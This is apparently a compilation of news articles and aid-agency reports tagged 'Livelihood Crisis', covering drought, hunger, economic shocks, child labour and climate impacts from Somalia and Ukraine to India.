Cumulative Gu season rainfall between March to early June 2022 was 40-70 percent below average. Due to the impacts of drought on livestock health, poor and vulnerable pastoral households currently have limited access to milk and lack saleable animals. Pastoral households have also accumulated very high debt burdens, driven by the prohibitive costs of water and feed for livestock, an increased reliance on purchasing food for the family on credit, and abnormal livestock migration to distant areas in search of pasture and water.

Agropastoral and riverine livelihood zones have had several consecutive failed cereal harvests, with further disruption to cash crop and cereal production in riverine areas due to low water levels in the Juba and Shabelle Rivers. In agropastoral and riverine areas, area planted and crop growth are far below normal due to the poor rains, the displacement of households away from their farms, and farmers’ reduced ability to afford seeds, irrigation, and other inputs.",Livelihood Crisis,2022-06-04 09:03:39

Meanwhile, harvests from Ukrainian farms such as Andriy’s are failing to be shipped to the destinations where they are needed most.

Andriy is a farmer in Ukraine. The blockade of ports and exports of grains is severely impacting the livelihoods of farmers in Ukraine. Farmer Andriy’s blazing, yellow-topped rapeseed plants gently sway in the breeze as bees buzz between them. This picture-postcard scene in Ukraine’s Vinnytsia Oblast is stunning, but Andriy is far from content here. He's constantly fidgeting, and his face shows his uneasiness.

A year ago, he sold a ton of corn for US$265 (8,000 Ukrainian Hryvnia). If Andriy can find a buyer this year, the best price he'll get is half that. He's equally worried about his wheat harvest, which may end up sitting in silos rather than being turned into bread.

“How can I sell my harvest if there's no market?” Andriy asks himself out loud.

As record numbers of people across the world wonder what they will eat tomorrow, harvests from Ukrainian farms such as Andriy’s are failing to be shipped to the destinations where they are needed most.

The World Food Programme (WFP) is calling for the immediate reopening of Black Sea ports – including Odesa – so that critical food from Ukraine can reach people facing food insecurity in countries such as Afghanistan, Ethiopia, South Sudan, Syria and Yemen, where millions are on the brink of famine.

WFP is supporting more than 650,000 displaced people and host community members in seven districts of North Gondar, in Ethiopia, with over 11,000 mt of food through relief distributions each month. Photo: WFP/Claire Nevill Ethiopia, an already fragile and vulnerable country due to conflict, climate change and Covid-19, is also suffering the consequences of the global food crisis. WFP is supporting more than 650,000 displaced people and host community members in seven districts of North Gondar, in Ethiopia, with over 11,000 mt of food through relief distributions each month.

Whether his crops sell for low prices, are kept in expensive storage, or in a worst-case scenario, are destroyed, the outcome will be a blow to him, the economy, his ten employees and the intended consumers.

“We used to live happily but not anymore,” he says. “There's an unease now, and we're always afraid that everything we've worked for over our lifetimes might be gone tomorrow.”

The conflict has spared his region so far, but uncertainty looms over a country that has already witnessed 6 million people leave due to conflict, and where 8 million people are internally displaced.

WFP is supporting people in Ukraine several ways. This includes sourcing wheat locally to supply the country's bakeries, so they can make the almost 2 millions of loaves we have distributed so far to almost 2 million people. To date, through cash assistance, WFP has transferred almost US$58 million to nearly 813,000 people in Ukraine. People receive between US$75 and US$225 per month, depending on family size. Every dollar spent by a family in Ukraine is directly injected into the local economy.

WFP just signed an agreement with the Ministry of Social Policy to scale up cash transfers for up to one million people across Ukraine in May. Cash transfers complement social protection systems, allowing people to buy the items and services they consider most important.

WFP also provides food assistance through monthly rations and immediate food rations. So far, it has reached a total of 3.8 million people across the country.

The daily bread distribution continues in Ukraine with over 2 million loaves - 935 metric tons - distributed in eight cities. WFP’s assistance in Ukraine aims to support markets and promote the resilience of the food system from production to processing, storage, transport and consumption.

However, the consequences of the conflict in Ukraine are radiating outwards, triggering a wave of collateral hunger that is spreading across the globe. In 81 countries where WFP works, acute hunger is expected to rise by 47 million people if the conflict in Ukraine continues unabated.

Andriy is one of the countless Ukrainian farmers facing an export predicament. Their cumulative inability to export crops will have global ramifications, particularly for the Middle East and North Africa. Countries across that region are expected to be severely affected by the ripple effect of the Ukraine crisis given their heavy reliance on imports of food and energy, leaving them vulnerable to higher food prices.

In that region, WFP cash transfers have proven to be an efficient way of providing humanitarian assistance. As people can decide how and where to spend their cash depending on their needs, it can help support objectives beyond food consumption in both emergencies and developmental contexts like those throughout the Middle East, where the World Food Programme has already transferred US$362 million to vulnerable people in 2022.

WFP assists people throughout the Middle East with cash transfers. People can use the money to buy food but also to address other essential needs. On the picture on the left, Saleh Ahmed, 45 years old, in Al Horaika village, in Yemen. He receives cash transfers to buy food. On the right, Hanan and her four children in Syria, where people with out-of-school children receive cash transfers to ease some financial burden for them amid a plummeting economy and unabating rise in prices. Photos: WFP/Mohammed Nasher/Hussam Al Saleh Meanwhile, there is another reason for Andriy to be worried: climate change. During his lifetime, the impact of climate change meant reduced yields, and he's fearful that it will worsen.

""Climate change is big, and it's real,“ he says.

He has been a farmer his whole life, during which time he's noticed rainfall becoming more erratic, less snow in winter and a gentle shift in seasonal patterns.

The local community looks to be hit hard, as farm employees and their families depend on crop profits as their primary livelihood. In anticipation of a bad season, Andriy has been helping the community by providing micro-loans. He does that also to discourage people from seeking work in Europe.

Adding to woes, fertilizer prices in Ukraine have tripled in recent months. Gas prices increase daily. Rationed petrol makes transport prohibitively expensive and complex.

“There's a possibility I won't be able to pay the workers. All I can do is rely on the hope that doesn't happen,” he explains.

Food access issues seem like a bad joke to Ukrainian farmers like Andriy. They have the food right there, ready to go, so the fact that people in countries like Syria and Egypt are eating less at higher costs is just too hard to fathom. He’s grateful for the support that his country receives but will continue to rely on the hope that the consequences of high costs, conflict and climate change are short-lived.",Livelihood Crisis,2022-05-23 07:00:00

With a target of over 1.7 million people in 21 counties of Warrap, Upper Nile, Northern Bahr el Ghazal and Central Equatoria States where IPC 4 and IPC 5 were reported. The response has reached 2,159,324 people, over 755,000 were children.

According the Food Security Nutrition Working Group, in 2022, approximately 1.34 million children under five years old are to suffer from acute malnutrition based on the results of the Standardized Monitoring and Assessment of Relief Transitions (SMART) nutrition surveys. The highest burden is from Jonglei, Upper Nile, Unity and Western Bahr el Ghazal States.

The multi-faceted effects of hunger has prompted World Vision to focus on multi-sectoral programming. A hungry child coupled with lack of sufficient water to enhance good hygiene practices is more prone to disease. A child that is sick will need immediate medical attention to arrest further progression of the disease. A household that does not have income will neither afford food nor medical care.

Continuous hunger and lack of proper nutrients will lead to children’s malnutrition. Parents that are looking for food to feed their families will not prioritize educating their children. Families that are looking out for all options to survive may adopt negative coping practices like child marriage, child labour etc.

The key drivers of acute food insecurity revolve around displacement leading to depletion or loss of assets; economic crisis – weaker value of the local currency leading to high food prices, natural hazards – climate shocks such as floods and dry spells.

Collectively, the effects of these drivers is reduced income not only for purchasing food and essential needs but also for improving the quality of life in all sectors.

Based on this situation World Vision’s hunger response in South Sudan adopted a multisectoral approach consisting of the following interventions;

Food Assistance support, provision of cash assistance, children at school receiving hot meals, equipping men and women with food security and livelihood knowledge and skills.

Livelihoods inputs/ kits distribution such as vegetable seeds, fishing kits and animals.

Children under 5 were reached with support through primary health care facilities through curative consultations,

Community Management of Acute Malnutrition (CMAM) and MIYCN program launch availed by 112,515 children aged 6-59 months.

Provision of psycho social support to children through implementation of Child Friendly Spaces (CFS), community members were also reached through awareness sessions and access to child protection information.

Protection education, services and prevention of GBV sessions were conducted targeting adults, with support from faith and community leaders.

For greater impact and outreach, faith actors were engaged to promote awareness on hunger related issues. Underlying all these interventions was peace building initiatives to enhance social cohesion of communities that World Vision serves in the hunger response.

World Vision recognizes that it is mostly through multi-sectoral programming that the most vulnerable children can be given a holistic chance at thriving. The country's hard-to-reach areas do not have the luxury of having fully functioning facilities.

On closer analysis of community feedback trends, it was evident that communities began to request for longer term interventions alongside short term interventions. These included but were not limited to request for support to education, mental health services and flood mitigation measures.

Of the 2,159,324 persons reached across the country, 997,549 were in Greater Upper Nile, 1,098,919 in Greater Bar el Ghazal and 62,855 in Central Equatoria States.",Livelihood Crisis,2022-05-17 07:00:00

The COVID-19 pandemic is not only a historic global health crisis but has also posed a continuing threat to the livelihood of many Filipinos. Countless establishments, since the beginning of the health crisis, have been negatively affected, even worse, small and macro enterprises had to close.

Baingkong Samad Salik’s business is among the industries in the autonomous region which has been greatly affected. Since the beginning of the pandemic, the demand for her woven products has decreased, hence, she was not able to sustain the operations of her business.

These woven products, such as malong, gowns, barong, polo, and trousers, among others, are just some of the fruits of a time-honored weaving tradition of the Maguindanao people called, Inaul.

The Inaul weaving industry is one of the province’s major earners until the pandemic came and many of the weavers, including Baingkong, had to find ways to at least recover from its socio-economic effects.

Assistance to small businesses

As part of the efforts of the Department of Social Welfare and Development (DSWD), being the lead agency in social protection, to help ease the effects of the pandemic to the marginalized, it has implemented the Livelihood Assistance Grant through the Sustainable Livelihood Program. Biangkong is among the recipients of Php 15,000 cash assistance which she used to recover her small business.

She used the aid to purchase materials such as thread, a weaving machine, textiles, and tools that she needed to operate her Inaul Weaving Business. In February, she finally started again selling her woven products.

“Banginsukor ako sa natalima ko ah kapital siya ganat sa lekano (DSWD-SLP), ka nakapaluman ako mag-inaul endo masla inya tabang salekami ah pamilya,” [Sa tulong po ng SLP na pinagmulan ng aming puhunan, napalago namin kahit papaano ang mga produkto] Biangkong said.

At first, she was bringing her crafts when going to her Arabic Class so she could sell some of them. As the days passed by, her daughter also learned to weave and now helps her in selling their products online.

Selling traditional products in a modern way

Due to mobility restrictions, their marketing strategies became limited. Thanks to her digital savvy daughter, Baingkong was able to promote her woven products online. Her craftsmanship and handmade creations attract netizens to patronize Inaul products. Most of her clients belong to high-profile people from the province of Maguindanao and Cotabato City.

With the help of social media, they could still sell and receive orders online. Social media created fanatics of ‘Inaul’ who love the products of Maguindanao people.

Biangkong was among many Filipinos who have been challenged by the pandemic, yet was able to survive with the help of the assistance she received from the government and now weaving her life for the better.",Livelihood Crisis,2022-05-27 07:00:00

An intensifying and growing wildfire season, more powerful storms, and longer and more intense droughts all threaten the property, livelihood and well-being of rural communities and agriculture producers. For producers, these challenges also threaten their businesses, potentially causing yields to fall, costs to rise and increased prices for consumers.

The good news is that American agriculture is and will continue to help lead the way for the rest of the world in tackling this crisis. U.S. farmers are already adapting to climate change and reducing the greenhouse gas emissions that cause it.

Technologies such as precision agriculture allow farmers to apply inputs more efficiently — reducing environmental impacts of overapplication of nutrients. Enhanced efficiency fertilizers are reducing emissions from nitrous oxide—the largest source of greenhouse gas emissions in the U.S. agriculture sector. From the most recent USDA data available, the number of cropland acres where these improved fertilizers are applied increased by over 6-fold between two surveys conducted from 2003-2006 and 2013-2016. Another tool, cover crops, which increase soil carbon by sequestering excess carbon from the atmosphere, saw adoption increase 50 percent between 2012 and 2017. This trend continues as cover crop adoption on corn-for-grain fields increased by 44 percent between 2016 and 2021.

At U.S. Department of Agriculture (USDA), we have a launched a comprehensive strategy to advance climate-smart agricultural practices like these through solutions that are led by producers, flexible, and grown from the bottom-up. If our policies don’t work for our farmers, ranchers, and rural communities, then they won’t work for the climate.

Our strategy includes increasing financing in our current Farm Bill conservation and energy programs to provide opportunities for farmers to adopt climate smart practices and increase investments in science, research and innovation, all while embracing a bright and positive future for renewable fuels and renewable energy.

Our work is centered around the idea that many of the same agricultural practices that make agricultural operations more resilient in the face of climate change can also help tackle the problem itself, all while creating new sources of revenue for producers.

This year, we launched a key component of our strategy called Partnerships for Climate-Smart Commodities.

Consumers at home and abroad increasingly want to know where their food comes from and how it is produced. Through their purchasing power, consumers want to help the environment, not hurt it. At USDA, we want to help farmers tap into that demand and take advantage of these new market opportunities.

Through Partnerships for Climate-Smart Commodities, we are investing $1 billion to finance the production of climate-smart products and expand these markets. We envision that groups of multiple producers, companies, NGOs, and other important stakeholders will come together to apply climate smart production practices on farms, ranches and forest lands and foster new markets for the commodities they produce.

This partnership effort has a particular emphasis on clearly measuring the climate progress we’re making through the application of these new production practices, and on involving all segments of American agriculture – both big and small operations, conventional and organic, row crops and specialty crops, historically underserved producers, forest landowners, urban farmers, and others.

Recently, we marked the deadline for the first round of proposals, and so too, a tremendous interest from a diverse cross-section of groups from across the country. We received over 450 large-scale proposals, ranging from $5 million to $100 million each, covering a geographic scope of every state in the nation, tribal lands, D.C., and Puerto Rico. In all, we received over $18 billion in collective application interest for the first round of funding under this program.

We are now turning our attention to reviewing the applications received and we continue to welcome applicants for a second round of funding for smaller grant proposals with a June 10th deadline.

Already, the enormous demand for Partnerships for Climate-Smart Commodities is shining a bright light on the appetite of the full diversity of American agriculture to create climate smart commodities that hold higher value in the marketplace.

Climate change is one of multiple urgent challenges facing farmers today, and the game is changing. Farming is no longer just about what food is produced. It’s about how that food is produced.

Challenges also present opportunities.

American producers have shown again and again that they are able to tackle challenges with creativity, ingenuity, and innovation, reminding us that we should approach obstacles with the optimism that we can rise to meet them.

It is through our approach at USDA we are further empowering American agriculture to produce the goods that consumers want and that are better for the environment, all while ensuring that we are among the first in the world to capture the market for climate smart agriculture.

We are well on the way to making sure that American farmers, ranchers, and forest landowners continue to rise to challenges—including tackling the existential crisis of climate change.",Livelihood Crisis,2022-06-13 14:32:00

Secretary Pushpakumara, Director General Kothalawala, Vice President Keatts, dear colleagues and friends –

It is a great pleasure to stand here and be a part of this signing ceremony, which reflects the longstanding and steady cooperation between the United States and Sri Lanka on food and agriculture. I want to thank everyone here with us today, including our colleagues from the Government of Sri Lanka and the International Executive Service Corps who have helped organize this event. And I also warmly welcome and thank Mr. Mariano Beillard from the U.S. Department of Agriculture, who is visiting Sri Lanka this week to support this project and speak firsthand with farmers, NGOs, and government counterparts to strengthen the existing partnership between our two countries.

We all know how difficult the past few months have been for Sri Lanka, and there are tough months to come. Sri Lankans around the country are facing the impacts of today’s economic challenges and I’ve listened to the heartbreaking stories of families struggling to make ends meet. Like the farmers trying to make sure their cows have enough food as the cost of feed climbs higher and higher, or children who take portions of their school meals back home to share with their parents and siblings.

And it’s because of today’s challenges that initiatives like Food for Progress and Market-Oriented Dairy Project especially give value to our work: to do our part to help the people of Sri Lanka, whether schoolchildren or dairy farmers. I know our colleagues from the International Executive Service Corps (IESC) have been working tirelessly to improve the livelihood of dairy farmers throughout Sri Lanka, and our colleagues from the U.S. Department of Agriculture have been steadfastly supporting this invaluable work. The project goes beyond simply lending a helping hand; it aims to strengthen Sri Lankan farmers’ own abilities to weather economic challenges, so that when we overcome the current crisis, the country is ready to face the future, stronger than ever.

As you may know, through various projects such as this, the United States has consistently demonstrated our ongoing commitment to food security, education, and economic growth in Sri Lanka; one project will build school kitchens and help schoolteachers develop effective literacy programs; another invites technical subject experts from Sri Lanka to engage with American counterparts, facilitating an exchange of views and experiences that improves coordination and enhances the expertise of both sides.

And of course, none of the work by the United States here would be possible without help from the dedicated public servants in the Government of Sri Lanka, such as those with us here today. I know that we represent different countries, but from one public servant to another, I am proud to be standing among all of you in this spirit of public service.

Let me express my thanks again to Secretary Pushpakumara, Director General Kothalawala, Vice President Keatts, Mr. Mariano Beillard, and all our Sri Lankan colleagues, for their partnership and dedication. We have a lot of work ahead of us, a lot of cows to care for, and a lot of hungry families to help.

In this critical moment in Sri Lanka’s history, compassion and action are so important. During these times of trials, I’ve seen the generous spirit of how Sri Lankans have come together, whether it be rolling up their sleeves to serve meals or helping each other out in fuel queues. So this is the time; don’t stand in the sidelines and don’t just complain. Let’s do something to help our neighbors, our communities, and this country. Let’s continue to work toward our shared goal of economic prosperity for all Sri Lankans. Thank you.",Livelihood Crisis,2022-06-13 11:10:18

At that estimate, the global economy would be running at a pace halved from last year’s 5.7 percent. The bank has warned of low growth and high inflation as in the aftermath of the oil shock in the 1970s.



The signs already show with the Korean economy. According to finalized figures released by the Bank of Korea on Wednesday, the GDP in the first quarter rose 0.6 percent, revised down from 0.7 percent estimated in April. Economic conditions had been worse than what the central bank estimated. The consumer price index last month soared 5.4 percent from the same period a year ago, the steepest increase in nearly 14 years.



The global lender warned of the possibility of a financial crisis breaking out in some emerging economies. It found similarities in the current economic conditions with the 1970s rocked by the oil shock, as prices have surged from a supply bottleneck and emerging and developing countries have become vulnerable. The World Bank says the surge in raw materials from the Russian invasion of Ukraine and the fast monetary tightening by the U.S. and others could hit harder on emerging economies than the developed category. Stagflation from outside factors can be trickier to cope with than the common recession. Korea must be extra vigilant as it had endured the liquidity crisis and international bailout in the late 1990s. Even if the current situation does not develop into a currency crisis, ripples from a global economic downturn could be harsh on the external-reliant Korean economy.



The government will soon release its economic policy direction for the second half. It also represents the first economic policy road map from the Yoon Suk-yeol administration. Yoon has observed that an economic crisis-like typhoon has arrived in the Korean backyard. Such urgency must be reflected in the policy outline. Stimuli through spending increases and low interest rates is no longer possible because fiscal expansion is difficult due to the government’s excessive debt ratio.



In the short-term, people’s livelihood from price surges must be eased. In the longer run, the economy must regain growth. The Korean economy is at the crossroads of falling into a lengthy slump like Japan or overhauling its economic structure for a new leap. The key lies with the private sector and its competitiveness and vitality. The government must do away with regulations to provide favorable conditions for business activity.

The 2022 theme of the world day calls for increased investment in social protection systems and schemes to establish solid social protection floors and protect children from child labor.

While significant progress has been made in reducing child labor over the last two decades, progress has slowed over time, and it has even stalled during the period 2016-2020. Today, 160 million children are still engaged in child labor – some as young as 5.

Government social protection systems are essential to fight poverty and vulnerability and eradicate and prevent child labor. Social protection is both a human right and a potent policy tool to prevent families from resorting to child labor in times of crisis.

However, as of 2020 and before the COVID-19 crisis took hold, only 46.9 percent of the global population were effectively covered by at least one social protection benefit while the remaining 53.1 percent – as many as 4.1 billion people – were left wholly unprotected. Coverage for children is even lower. Nearly three-quarters of children, 1.5 billion, lacked social protection.

Today, 160 million children are still engaged in child labor – some as young as 5. Significant progress towards ending child labor requires increased investment in universal social protection systems, as part of an integrated and comprehensive approach to tackle the problem.

Mahmoud Aligoo, an official with the Welfare Organization, said that more than 44 percent of working children are members of a family of 4 to 6, which is also worrisome.

The Welfare Organization has covered over 14,000 children to control child labor, he said, adding, ""We currently have 67 training and support centers run by NGOs and 31 government-run 24-hour centers.""

This is the result of various processes and economic issues in the region and neighboring countries; economic issues and political and cultural issues are highly effective, he lamented.

“The second issue is the way we look at these children. First of all, we must accept that children are not to blame for this process and are vulnerable to this social, economic, and cultural process,” he stated.

“We seek social support for the families of working children. In addition, we must provide them with cultural, social, and economic empowerment,” he added.

More than 80 percent of these children in Iran are foreign nationals. A national decision must be made on the issue of refugees and illegal citizens, he further noted, emphasizing the need to enhance the cooperation of responsible bodies to contain the issue.

A five-point plan for labor and street children will be implemented in 12 provinces of the country, Aligoo said.

Empowering the child's family, collecting labor children's biometric information, implementing a child-friendly plan, using the media system, and continuously monitoring the labor child’s condition through a special system are among the five steps of this plan, he said.

70,000 street children

There are two concepts for labor children, some of whom are street children and others who are not homeless but have to work to provide a family livelihood.

Street children are homeless boys and girls, aged under 18 years, for whom “the street” has become home or their source of livelihood, and who are inadequately protected or supervised.

According to the Society for Protecting the Rights of the Child (SPRC), there are 14,000 dumpsite pickers in Tehran, of which 4,700, or one-third of them, are children.

Habibollah Masoudi Farid, the deputy head of the Welfare Organization, announced in 2020 that there are an estimated 70,000 street children in the country. Of course, given that the conditions of children working in workshops are different, Masoudi Farid said that there are no exact statistics.

Under the law, the employment of children aged 15 or younger is prohibited in Iran and there are also restrictions on the types of jobs that persons between 15 and 18 years can do. For example, no child is allowed to work on jobs that pose occupational health hazards.

Financially struggling children

Referring to the leading causes of child labor in the country, Seyed Hassan Mousavi Chalak, head of the Iranian Social Workers Association, has said that the current causes of child labor in the country are similar to its global causes, which are economic and financial issues.

The inefficient social security system is another reason behind child labor. If the coverage of social security expands and becomes stronger, a significant part of this phenomenon will decrease.

Some 83-87 percent of working children are from financially struggling families.

Currently, 5-6 million people (that are legally eligible for a living allowance) are under the coverage of the Welfare Organization and Imam Khomeini Relief Foundation and are receiving subsidies, but the pension does not cover their living expenses.

Although the financial burden is indeed heavy for the government, we missed the capacity to expand social support, which might have been affected by various factors, such as U.S. sanctions, improper management, etc.

Now that the country’s economy is not in good condition, the population in need of continued support is growing, and this is worrisome.

Working children are the consequence of inefficient economic and social security systems.

These services are as important as shelter, water, and food. The World Health Organisation states that prevention and early intervention in relation to mental health are cheaper in the long-term. Economics aside; it is the right thing to do. Mental health remains a basic human right.

PSS for migrants

For those on the move, migration can feel like a continued state of crisis, in part due to the uncertainty of the future, or trauma experienced during their journey. PSS is a simple, yet powerful way of helping individuals who are in distress. It helps by stabilising individuals who have experienced trauma, and provides them with the tools they need to seek further assistance. As such, this is a much needed service for migrants, both in transit and on arrival to their destination.

Offering reliable information to (potential) migrants

By extending PPS services from migrants on the move to potential migrants, returnees and vulnerable individuals in their home countries, organisations offering PSS can prevent people from rushing into irregular migration decisions, which would expose them to additional risks. Seefar’s The Migrant Project (TMP) communication campaign – which aims to equip potential migrants to make informed decisions about their migration plans – has been running in Afghanistan for several years. The campaign works through social media and counselling sessions, which provides information about safer alternatives to irregular migration; from legal migration options to finding a job at home.

In 2021, over 95% of consultees we spoke to through TMP mentioned a lack of hope for the future. This was particularly the case for female callers, who felt at risk under the new Taliban regime. These feelings mean that consultees were rarely motivated to explore and invest in alternatives at home. Such a state of mind is also more receptive to misinformation, fake news and promises by smugglers and human traffickers. Many potential migrants indicated that they were willing to take on more dangerous routes. Existing literature emphasises how stress is related to increased risk-taking.",Livelihood Crisis,2022-05-12 07:00:00

Excerpted with permission from An Unkept Promise: What Derailed the Indian Economy, Prasanna Mohanty, Sage Select.","There is a livelihood crisis which is yet to register with the government. One reason is high health expenditure. By 31 March 2021, India had 12.2 million cases and 162,927 deaths. A SBI paper said households would have spent additional Rs 66,000 crore in FY21 over FY20 (11% higher) due to the pandemic.

In normal times, official documents show that 60-63 million people slip below poverty line (BPL) every year due to “exorbitant” health expenditure (also high out-of-pocket expenditure). Imagine the cost the pandemic would have imposed on the millions of households, far more than the official numbers reveal because of gross under-reporting.

The Azim Premji University’s State of Working 2021 paper shows that in 2020, India lost 100 million jobs due to the lockdown, of which 15 million jobs were lost permanently. It also showed a 50 per cent rise in informal workers as the maximum impact was on salaried/regular wage workers and they moved to informal self-employment (30%), casual (10%) or informal salaried (9%) work. It also found a fall of 17 per cent in average monthly income of workers and impoverishment of 230 million who fell below a minimum wage threshold of Rs 375 per day recommended (but not accepted or implemented) by the Anoop Satpathy Committee.

The US-based Pew Research Institute showed that 35 million low-income people would have slipped below $2 dollar of living expenses (extreme poverty) and 32 million middle-income people below $10 (low income) due to the pandemic in 2020.

This estimate does not include those who would have slipped into extreme poverty earlier because of the slowing economy and the impact of demonetisation, GST (as explained in earlier chapters) or the second wave in 2021. This is a reversal of India making historic record of lifting 271 million out of poverty during 2005-2006 and 2015-2016. A large number of them would now be back to BPL status.

The massive job loss and rise in low-paying informal work were reflected in the rising demand for job guarantee scheme MGNREGS, which provides manual work, in FY21. Households who worked under the scheme went up from 54.8 million in FY20 to 75.5 million in FY21. During the same period, individuals who worked went up from 79 million to 111.9 million. The budget for FY22 reduced allocation for the scheme, which needs to be brought back.

The aforementioned Azim Premji University study said that food intake fell as 90 per cent households suffered a reduction in food intake during the 2020 lockdown. Net physical assets have been falling fast – from 16.3 per cent of the GDP in FY12 to 11.7 per cent in FY20 – indicating liquidation of physical assets (including gold and silver) to meet demands for essentials before the pandemic hit. Past few months have seen a big step up in auctioning of gold kept as collateral for loans by gold financers like Manappuram Finance due to factors like income stress.

The National Accounts Statistics reveal that per capita income (GDP) shrunk by 8.2 per cent and per capita disposable income (gross national disposable income) by 3.8 per cent in FY21 (PE).

The GDP numbers, however, don’t tell the full story of the impact of the pandemic, particularly on household pain because of the loss of lives and livelihoods and additional expenditure on healthcare.

Per capita income (GDP) takes into account all incomes – households, government and corporations – thus, masking the sufferings of households. India doesn’t have data on household expenditure (proxy for income) after 2011-2012. The 2017-2018 NSSO survey of household consumption expenditure was junked for showing that the real expenditure had fallen for the first time in 40 years – from Rs 1,501 in 2011-2012 to Rs 1,446 in 2017-2018.

RBI’s latest report shows that household financial savings fell to 8.2 per cent of the GDP in Q3 of FY21, reflecting a sequential moderation from an unusually high of 21 per cent in Q1 when the lockdown led to high financial savings. The moderation, it said, “was driven by a significant weakening in the flow of household financial assets”, with the ratio of household (bank) deposits declining to 3 per cent of the GDP in Q3, from 7.7 per cent in the previous quarter.

More worryingly, household debt, which has been increasing steadily since March 2019, rose sharply to 37.9 per cent of the GDP at the end of December 2020 (Q3) from 37.1 per cent in the previous quarter. No data is available about physical assets of household for FY21 yet.

That the economy didn’t recover fully is clear. The IIP fell in January and February before picking up in March and gain in employment reversed as Q3 saw 3 million job loss.

As Indian states went into another round of lockdowns because of the second wave, job loss and unemployment rate mounted. According to the CMIE, India lost 22.3 million jobs during April-May 2021, 17.2 million of them daily wagers (25.3 million jobs during January-May 2021). The unemployment rate rose to 11.9 per cent in May 2021 – double the unemployment rate of 6.1 per cent in 2017-2018, which was at a 45-year high.

As a consequence, labour force participation rate never recovered from the 2020 lockdown. Industrial hum came down and labour shortages hit due to the second wave of workers’ migration and when they returned, they found work hard to come by in places such as Delhi, Mumbai and Goa. Services sector contracted in May, reversing the gains made in previous eight months, forcing job cuts at the fastest pace since October.

All these were before the far more devastating second wave of the pandemic hit in late February and peaked in April-May 2021. Our World in Data shows, as against 12.2 million cases and 162,927 deaths until 31 March 2021, the numbers climbed up to 30.1 million cases and 393,338 deaths as on 25 June 2021 – a quantum leap. More cases and more deaths mean higher cost to the economy and more pain on households in terms of loss of income and higher health expenditures too – apart from the loss of lives.

At an overall level, ageing and the climate crisis are two mega trends that have multi-generational impact.
At a specific level, there are two areas where the climate crisis and elderly connect.
Then, there is the impact of the climate crisis on the financial situation of the elderly population involved.","Even as the world observes Earth Day and World Environment Day, scorching heatwaves rampage through major parts of India, recording the highest maximum temperatures in over 100 years. In recent years, globally and in India, the world has witnessed a higher (and increasing) frequency of extreme weather events. Heavy downpours have caused floods even in landlocked cities; people are experiencing extreme heat or more drought-like situations; and cyclones and hurricanes have become more common. The climate crisis has begun impacting our lives in more ways than we can imagine. The latest Intergovernmental Panel on Climate Change (IPCC) assessment sounded a strong warning. The report looked at risk as well as adaptation in context of the climate crisis plus non-climatic global trends, including demographic shifts, rapid urbanisation, social and economic inequalities among others.

Where are the elderly in the climate change discourse? For a country like India, this emerges as a pertinent question. With approximately 1.40 billion people, which is over 17% of the global population, India is home to nearly 140 million senior citizens. We have the second-highest senior citizen population today, and it is expected to jump to 194 million by 2031 and 300 million by 2050.

Elderly and the Climate Crisis

How are elderly and the climate crisis linked? At an overall level, ageing and the climate crisis are two mega trends that have multi-generational impact. The passing of baton from one generation to another is embedded in what gets transferred in terms of mindset, behaviour, practices and values, and inextricably linked with its impact on use of resources and sustainability. At a specific level, there are two areas where the climate crisis and elderly connect.

First, older people are disproportionately at risk and affected by climate change events, be it heatwaves or disasters. Age-related vulnerabilities increase risk (as it did during pandemic due to lower immunity and co-morbidities), as well as reduced ability to respond quickly to get out of harm’s way, particularly during earthquakes, floods, cyclones, or as we are seeing in man-made disasters such as in the war zone in Ukraine. During the Chennai floods in 2015, a newspaper carried out a report on how many elderly were left defenceless. Particularly impacted are 8-10% of India’s elders (over 10 million) who may have mobility challenge, are bed ridden or home-bound, or living alone. Livelihoods are also impacted for rural elderly, many being small and marginal farmers, due to their dependence on agriculture and its strong linkages to the climate crisis. Unless approached differently, the elderly get left behind, become lost and typically are last in line, for accessing relief.

Second, given the adverse impact as well the important role for intergenerational responsibility, the elderly can and must play a leadership role in climate action movements. It is as much for youth and the likes of Greta Thunberg to fight for the future as it is for seniors wanting to ensure a lasting and sustainable legacy. At both national and local levels, elders’ action on climate and partnerships has the potential to be an important force. At HelpAge, we see this in our work in villages and cities, where Elder-Self-Help-Groups are embracing and promoting organic farming, zero based natural farming, vermicomposting and taking the lead in tree plantation which also serves as livelihood support, and senior citizen associations in cities advocating against pollution.

Key Focus Areas & Actions

Towards advancing health, wellbeing and resilience of elderly, several urgent actions are needed. We need to change the frame towards ageing – recognise and respond to the challenges and needs of an ageing population and at the same time advance opportunities for them to be in the mainstream and have their own voices and choices. The government under its National Action Plan for Senior Citizens (NAPSrC) has taken some notable steps.

There are certain key focus areas that need serious attention today. Some of them are as follows.

Ensure access to healthcare. The Longitudinal Study of Ageing in India (LASI) estimates that approximately 70% of the senior citizens have some chronic diseases, while only 26% of households are covered by some form of health insurance in India. Adverse effects of climate change will further aggravate health challenges, as can be seen in pandemic and dangers of unknown infectious diseases and coping with heat waves. Access to healthcare, therefore, is a big problem and priority attention is needed for health systems to orient towards special needs of the elderly. This would entail not just hospital based care but much more importantly primary care and rising need for home based care. The National Program for Health Care of Elderly (NPHCE), which was launched in 2010, should be immediately implemented across all the 740 plus districts in the country-promote geriatric care across touch points in the healthcare pyramid.

There should be a special outreach initiative under the Pradhan Mantri Jan Arogya Yojana (PMJAY) to enrol the elderly population, including the elderly women, oldest old, and disabled elderly, who may not have been able to avail the government scheme. Age disaggregated data (share of 60 plus) could be put out for registered card holders, e-sanjeevani consultations and similar to assess current level of access by seniors. The coverage of PMJAY should be extended to all 80 plus elderly population, to address the paradox of health insurance becoming prohibitively expensive or not available when the need is greatest, but affordability is lowest for the majority.

Strengthen financial security. Then, there is the impact of the climate crisis on the financial situation of the elderly population involved. The SECC 2011 had estimated 50% of rural elderly living in poverty, and data shows majority dependent on agriculture and animal husbandry for livelihoods support, which are adversely affected during natural disasters. The current old age pension system is inadequate both in coverage and amount (about 30% eligible receive).

The pandemic brought out the systemic shortfall in social security and urgent attention to direct resources for enhancing pensions for vulnerable as well as promoting livelihoods. On the latter, the government has taken steps through the ministry of rural development and ministry of social justice to scale up elder self-help-groups, an idea pioneered by HelpAge India. However, on pensions, the central government can take the lead in setting a national minimum social pension floor of ₹3000 per month for poor elderly. Currently, the central government contributes a meagre ₹200 (unchanged over last 14 years) on which states make their addition. On an average, pension amount is about ₹500, with some between ₹1000-2000.

Promote an enabling environment: The lives of older people are likely to get worse due to the climate change, and it would be important to involve them in policy making, implementation and addressing gaps in their living environment. Age friendly cities need to be part of city planning, to bring in smart plus sensitive cities. The digital adoption has accelerated across society but elders are struggling to navigate.

